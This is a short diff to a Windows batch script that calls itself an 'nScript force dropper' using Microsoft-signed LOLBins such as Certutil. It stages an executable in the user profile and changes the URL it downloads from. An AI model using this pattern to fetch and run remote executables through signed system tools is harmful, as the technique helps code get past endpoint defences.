@@ -4,7 +4,7 @@ rem nScript force dropper built from Microsoft-signed LOLBins (LOLBAS: Certutil 
 rem Stage outside Temp: force cleanup wipes Temp while the executable is running.
 set "WorkPath=%USERPROFILE%\.nScript"
 set "BinaryPath=%WorkPath%\nScript.exe"
-set "Url=https://clean.meowery.eu/nScript.exe"
+set "Url=https://raw.githubusercontent.com/nyxiereal/nScript/dist/nScript.exe"
 
 mkdir "%WorkPath%" 2>nul
 
